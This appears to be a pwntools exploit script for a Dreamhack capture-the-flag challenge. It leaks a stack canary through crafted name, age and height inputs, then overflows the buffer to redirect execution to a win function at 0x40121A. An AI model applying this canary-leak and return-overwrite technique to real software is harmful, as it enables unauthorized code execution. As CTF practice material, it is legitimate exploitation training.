from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/structperson/deploy/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:9596'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#gdb.attach(p, gdbscript = '''
#b * 0x40141E
#''')

#v5- name
p.recvuntil(b": ")
payload = b"A"*56
p.sendline(payload)

#v7 -age - 4bytes ah lol
p.recvuntil(b": ")
payload = b"-1" 
#just overflow cro
p.sendline(payload)


#v6 - height
#val = -595821443.5137254
p.recvuntil(b": ")
payload = b"-595821443.5137254"
#i did p/lf 0xc1c1c1c1c1c1c1c1 in pwndbg lol
#wtf - sending a newline somewhere in the double overwrites the canary null byte w the first byte...
p.sendline(payload)

#v7 + 4
p.recvuntil(b": ")
payload = b"D"*4 + b"d"
p.send(payload)

p.recvuntil(b"d")

data = p.recv(7)
val = u64(data.rjust(8, b"\x00"))
print(hex(val))

p.recvuntil(b"? ")
win = 0x40121A
ret = 0x40101a
payload = ( b"A" * 32 + #v4
            b"B" * 56 + #v5
            b"C" * 8 + #v6
            b"D" * 8 + #v7
            p64(val) + #canary
            b"E" * 8 + #rbp
            p64(win)
          )
p.sendline(payload)
p.interactive()
